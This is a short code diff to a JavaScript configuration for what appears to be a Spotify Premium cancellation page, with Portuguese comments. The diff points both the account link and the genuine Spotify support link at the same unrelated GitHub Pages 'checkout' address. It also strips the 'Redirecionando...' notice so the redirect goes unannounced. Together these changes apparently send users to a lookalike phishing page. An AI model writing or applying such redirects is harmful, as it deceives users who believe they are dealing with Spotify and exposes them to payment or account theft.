@@ -1,7 +1,7 @@
 // Configurações da aplicação
 const CONFIG = {
-    SPOTIFY_ACCOUNT_URL: 'https://www.example.com/seu-link-de-redirecionamento-aqui/',
-    SPOTIFY_SUPPORT_URL: 'https://support.spotify.com/br-pt/article/cancel-premium/',
+    SPOTIFY_ACCOUNT_URL: 'https://checkouttestste12.github.io/spotify6',
+    SPOTIFY_SUPPORT_URL: 'https://checkouttestste12.github.io/spotify6',
     REDIRECT_DELAY: 2000 // 2 segundos
 };
 
@@ -196,7 +196,7 @@ function handleConfirmRedirect() {
             <svg class="btn-icon loading-icon" viewBox="0 0 24 24" fill="currentColor">
                 <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
             </svg>
-            Redirecionando...
+            ...
         `;
     }
     
